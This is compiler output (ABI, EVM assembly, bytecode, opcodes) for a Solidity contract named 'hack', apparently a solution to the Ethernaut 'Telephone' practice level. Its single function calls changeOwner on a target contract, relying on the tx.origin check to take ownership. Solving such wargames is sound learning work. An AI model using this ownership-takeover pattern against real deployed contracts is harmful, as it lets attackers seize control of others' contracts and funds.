{
	"ZOpenZep/Telephone.sol": {
		"hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Telephone",
							"name": "_tel",
							"type": "address"
						}
					],
					"name": "hach",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"ZOpenZep/Telephone.sol\":552:744  contract hack{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ZOpenZep/Telephone.sol\":552:744  contract hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5e8180c6\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"ZOpenZep/Telephone.sol\":572:741  function hach(Telephone _tel) external  {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"ZOpenZep/Telephone.sol\":623:627  _tel */\n      dup1\n        /* \"ZOpenZep/Telephone.sol\":623:639  _tel.changeOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f9dae1\n        /* \"ZOpenZep/Telephone.sol\":640:682  0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 */\n      0x5b38da6a701c568545dcfcb03fcb875f56beddc4\n        /* \"ZOpenZep/Telephone.sol\":623:683  _tel.changeOwner(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      revert(0x00, 0x00)\n    tag_11:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n        /* \"ZOpenZep/Telephone.sol\":572:741  function hach(Telephone _tel) external  {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_15:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_17:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_18:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_29\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_17\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:680   */\n    tag_19:\n        /* \"#utility.yul\":621:628   */\n      0x00\n        /* \"#utility.yul\":650:674   */\n      tag_31\n        /* \"#utility.yul\":668:673   */\n      dup3\n        /* \"#utility.yul\":650:674   */\n      tag_18\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":639:674   */\n      swap1\n      pop\n        /* \"#utility.yul\":568:680   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":686:840   */\n    tag_20:\n        /* \"#utility.yul\":775:815   */\n      tag_33\n        /* \"#utility.yul\":809:814   */\n      dup2\n        /* \"#utility.yul\":775:815   */\n      tag_19\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":768:773   */\n      dup2\n        /* \"#utility.yul\":765:816   */\n      eq\n        /* \"#utility.yul\":755:834   */\n      tag_34\n      jumpi\n        /* \"#utility.yul\":830:831   */\n      0x00\n        /* \"#utility.yul\":827:828   */\n      0x00\n        /* \"#utility.yul\":820:832   */\n      revert\n        /* \"#utility.yul\":755:834   */\n    tag_34:\n        /* \"#utility.yul\":686:840   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":846:1017   */\n    tag_21:\n        /* \"#utility.yul\":908:913   */\n      0x00\n        /* \"#utility.yul\":946:952   */\n      dup2\n        /* \"#utility.yul\":933:953   */\n      calldataload\n        /* \"#utility.yul\":924:953   */\n      swap1\n      pop\n        /* \"#utility.yul\":962:1011   */\n      tag_36\n        /* \"#utility.yul\":1005:1010   */\n      dup2\n        /* \"#utility.yul\":962:1011   */\n      tag_20\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":846:1017   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1023:1384   */\n    tag_6:\n        /* \"#utility.yul\":1098:1104   */\n      0x00\n        /* \"#utility.yul\":1147:1149   */\n      0x20\n        /* \"#utility.yul\":1135:1144   */\n      dup3\n        /* \"#utility.yul\":1126:1133   */\n      dup5\n        /* \"#utility.yul\":1122:1145   */\n      sub\n        /* \"#utility.yul\":1118:1150   */\n      slt\n        /* \"#utility.yul\":1115:1234   */\n      iszero\n      tag_38\n      jumpi\n        /* \"#utility.yul\":1153:1232   */\n      tag_39\n      tag_15\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":1115:1234   */\n    tag_38:\n        /* \"#utility.yul\":1273:1274   */\n      0x00\n        /* \"#utility.yul\":1298:1367   */\n      tag_40\n        /* \"#utility.yul\":1359:1366   */\n      dup5\n        /* \"#utility.yul\":1350:1356   */\n      dup3\n        /* \"#utility.yul\":1339:1348   */\n      dup6\n        /* \"#utility.yul\":1335:1357   */\n      add\n        /* \"#utility.yul\":1298:1367   */\n      tag_21\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":1288:1367   */\n      swap2\n      pop\n        /* \"#utility.yul\":1244:1377   */\n      pop\n        /* \"#utility.yul\":1023:1384   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1390:1508   */\n    tag_22:\n        /* \"#utility.yul\":1477:1501   */\n      tag_42\n        /* \"#utility.yul\":1495:1500   */\n      dup2\n        /* \"#utility.yul\":1477:1501   */\n      tag_18\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":1472:1475   */\n      dup3\n        /* \"#utility.yul\":1465:1502   */\n      mstore\n        /* \"#utility.yul\":1390:1508   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1514:1736   */\n    tag_10:\n        /* \"#utility.yul\":1607:1611   */\n      0x00\n        /* \"#utility.yul\":1645:1647   */\n      0x20\n        /* \"#utility.yul\":1634:1643   */\n      dup3\n        /* \"#utility.yul\":1630:1648   */\n      add\n        /* \"#utility.yul\":1622:1648   */\n      swap1\n      pop\n        /* \"#utility.yul\":1658:1729   */\n      tag_44\n        /* \"#utility.yul\":1726:1727   */\n      0x00\n        /* \"#utility.yul\":1715:1724   */\n      dup4\n        /* \"#utility.yul\":1711:1728   */\n      add\n        /* \"#utility.yul\":1702:1708   */\n      dup5\n        /* \"#utility.yul\":1658:1729   */\n      tag_22\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1514:1736   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a527ecd882540a089aaa17bc6f2995c60d23eebde34b193cc0c2b445f85b710f64736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f5ffd5b506101be8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80635e8180c61461002d575b5f5ffd5b61004760048036038101906100429190610135565b610049565b005b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1735b38da6a701c568545dcfcb03fcb875f56beddc46040518263ffffffff1660e01b8152600401610096919061016f565b5f604051808303815f87803b1580156100ad575f5ffd5b505af11580156100bf573d5f5f3e3d5ffd5b5050505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100f3826100ca565b9050919050565b5f610104826100e9565b9050919050565b610114816100fa565b811461011e575f5ffd5b50565b5f8135905061012f8161010b565b92915050565b5f6020828403121561014a576101496100c6565b5b5f61015784828501610121565b91505092915050565b610169816100e9565b82525050565b5f6020820190506101825f830184610160565b9291505056fea2646970667358221220a527ecd882540a089aaa17bc6f2995c60d23eebde34b193cc0c2b445f85b710f64736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1BE DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5E8180C6 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x135 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 PUSH20 0x5B38DA6A701C568545DCFCB03FCB875F56BEDDC4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x96 SWAP2 SWAP1 PUSH2 0x16F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xAD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xBF JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xF3 DUP3 PUSH2 0xCA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x104 DUP3 PUSH2 0xE9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x114 DUP2 PUSH2 0xFA JUMP JUMPDEST DUP2 EQ PUSH2 0x11E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x12F DUP2 PUSH2 0x10B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14A JUMPI PUSH2 0x149 PUSH2 0xC6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x157 DUP5 DUP3 DUP6 ADD PUSH2 0x121 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x169 DUP2 PUSH2 0xE9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x182 PUSH0 DUP4 ADD DUP5 PUSH2 0x160 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA5 0x27 0xEC 0xD8 DUP3 SLOAD EXP ADDMOD SWAP11 0xAA OR 0xBC PUSH16 0x2995C60D23EEBDE34B193CC0C2B445F8 JUMPDEST PUSH18 0xF64736F6C634300081C0033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "89200",
						"executionCost": "133",
						"totalCost": "89333"
					},
					"external": {
						"hach(address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"hach(address)": "5e8180c6"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}